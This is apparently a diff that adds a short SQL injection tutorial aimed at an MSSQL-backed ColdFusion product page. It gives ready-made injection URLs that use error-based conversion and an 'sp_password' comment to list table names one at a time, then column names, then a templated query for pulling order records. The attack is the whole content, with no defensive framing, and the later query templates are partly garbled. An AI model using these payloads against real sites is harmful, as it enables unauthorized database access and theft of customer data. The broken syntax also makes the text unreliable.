@@ -1,0 +1,54 @@
+Get first table:
+
+select top 1 table_name from information_schema.tables order by table_name
+
+Example:
+
+http://site.com/ProductList.cfm?CatDisplay=371%20and%201=convert(int,(select%20top%201%20table_name%20from%20information_schema.tables %20order%20by%20table_name))--sp_password
+
+Get second table:
+
+select top 1 table_name from information_schema.tables where table_name not in (select top n table_name from information_schema.tables order by table_name) order by table_name
+
+Demo:
+Table 2:
+
+http://site.com/ProductList.cfm?CatDisplay=371 and 1=convert(int,(select top 1 table_name from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables order by table_name) order by table_name))--sp_password
+
+
+Table3:
+
+http://site.com/ProductList.cfm?CatDisplay=371 and 1=convert(int,(select top 1 table_name from information_schema.tables where table_name not in (select top 2 table_name from information_schema.tables order by table_name) order by table_name))--sp_password
+
+
+Retrieved column in the table called ten_table:
+(only what is need to transfer ASCII)
+
+select top 1 column_name from information_schema.columns where table_name=ten_table order by column_name
+
+Get 1 Column :
+
+select top 1 column_name from information_schema.columns where table_name=ten_table and column_name not in(select top n column_name from information_schema.columns where table_name=ten_table order by column_name) order by column_name
+
+Once you have stripped and table column in the table important, you get information as usual using the following:
+
+Retrieved final order:
+
+SELECT top 1 convert(varchar,convert(varchar,isnull(convert(var char,T[1].,C[1,1]),char(32))) char(32) char(124) char(32) convert(varchar,isnull(convert(varchar,T[1].,C[1,2]),char(32))) char(32) char(124) char(32) ... char(32) char(124) char(32) convert(varchar,isnull(convert(varchar,T[n].,C[n,m]),char(32))))
+FROM T[1], T[2], ..., T[n]
+WHERE T[1].orderId=T[2].orderId and T[2].orderId=T[3].orderId and ... and T[n-1].orderId=T[n].orderId
+ORDER BY T[1].orderId desc
+
+Get the first order:
+
+SELECT top 1 convert(varchar,convert(varchar,isnull(convert(var char,T[1].,C[1,1]),char(32)))
+
+
+Quote:
+
+char(32) char(124) char(32) convert(varchar,isnull(convert(varchar,T[1].,C[1,2]),char(32))) char(32) char(124) char(32) ... char(32) char(124) char(32) convert(varchar,isnull(convert(varchar,T[n].,C[n,m]),char(32))))
+FROM T[1], T[2], ..., T[n]
+WHERE T[1].orderId=T[2].orderId and T[2].orderId=T[3].orderId and ... and T[n-1].orderId=T[n].orderId and T[1].orderId=n
+
+With the first table T i, C [i, j] is the j th column of the table first, orderId column is numbered order order of each table
+
